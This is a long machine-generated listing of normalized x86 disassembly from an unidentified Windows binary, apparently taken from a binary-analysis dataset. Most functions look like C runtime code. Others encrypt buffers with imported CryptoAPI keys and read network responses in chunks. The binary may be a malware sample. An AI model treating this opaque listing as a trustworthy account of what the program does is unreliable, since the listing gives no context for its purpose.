mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001c121
sub_1001d737
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000834a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1001d7d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100476aa
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024441
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_1001d8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100896a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
push ecx
mov ecx [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
call sub_1005f410
add esp 0x8
mov esi eax
xor edi edi
cmp ebx esi
je r-xdata
mov esi [ ebp - 0x1c ]
cmp esi edi
je r-xdata
call sub_10018510
mov eax [ esi ]
mov [ ebx ] eax
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov edx [ esi + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x18 ]
cmp esi edi
je r-xdata
push esi
call sub_100187af
add esp 0x4
call sub_1002fbb0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
mov esi [ ebp - 0x1c ]
sub_1001d940
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ecx + 0x20 ]
sub edx [ ecx + 0x1c ]
mov eax 0x38e38e39
imul edx
sar edx 0x3
push esi
mov eax edx
shr eax 0x1f
push edi
mov edi [ ecx + 0x1c ]
mov ecx [ ecx + 0x20 ]
lea esi [ edx + eax - 0x1 ]
sub ecx edi
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx esi
ja r-xdata
lea edx [ esi + esi * 8 ]
mov eax [ edi + edx * 4 + 0x1c ]
lea esi [ edi + edx * 4 + 0x1c ]
mov edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
push r--data
call sub_1002d84e
mov ecx [ esi + 0x4 ]
add ecx edi
push ecx
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push edx
push eax
call sub_1007f5d0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1001da0a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10044649
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10007acd
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10059dd7
mov [ esi + 0x4 ] eax
sub_1001dab0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebx + ebx + 0x2 ]
mov [ ebp - 0x4 ] ebx
cmp esi eax
jge r-xdata
jne r-xdata
mov eax [ edi + esi * 4 - 0x4 ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov ecx [ edi + eax * 4 - 0x4 ]
mov [ edi + ebx * 4 ] ecx
lea ebx [ eax - 0x1 ]
mov edx [ edi + esi * 4 ]
mov [ edi + ebx * 4 ] edx
mov ebx esi
lea esi [ esi + esi + 0x2 ]
cmp esi [ ebp + 0x8 ]
jl r-xdata
dec esi
mov edx [ ebp + 0xc ]
mov eax [ edx ]
pop esi
mov [ edi + ebx * 4 ] eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp esi eax
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ edi + esi * 4 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
pop esi
mov [ edi + ebx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + esi * 4 ]
lea eax [ esi - 0x1 ]
mov [ edi + ebx * 4 ] edx
cdq
sub eax edx
mov ebx esi
sar eax 0x1
mov esi eax
cmp [ ebp - 0x4 ] ebx
jl r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
pop esi
mov [ edi + ebx * 4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_1001db65
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001f0b8
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_1001dbcd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_1007fa90
inc eax
push eax
push edi
push esi
call sub_1007ec90
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1001dc80
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
mov [ ebp + 0xc ] eax
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push [ ebx ]
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
push edi
push esi
mov esi [ CryptEncrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_100375b7
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp + 0xc ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1001dd7c
push 0x5c
mov eax sub_10085aed
call sub_1003fae8
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1005c1c5
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_100578b0
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10046e20
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_10070f60
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_1002f578
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10063060
mov eax [ ebp - 0x60 ]
call sub_1004642f
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_100578b0
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10046e20
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_1001deb0
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
retn
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
sub_1001df0c
push 0x8
push r--data
call sub_1007fb20
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_1007fb65
retn
push 0x6
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001df52
call sub_100848c6
inc [ rw-data ]
sub_1001df5b
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10080470
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_10017e58
mov [ eax ] edi
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
jmp r-xdata
push esi
call sub_100532c3
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_1004846a
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_10044649
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_1006299d
mov [ eax ] 0x1c
call sub_10017e58
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_1001e7b9
pop ecx
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10012f18
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1006c8bd
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_10041219
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_10041219
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1006c8bd
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1001e690
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xb8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xdc ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xe0 ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xe0 ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea esp [ esp ]
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xe0 ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_1001e7b9
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10017e58
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10053281
pop ecx
mov esi eax
call sub_1006299d
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1001e7dc
mov edi edi
push ebp
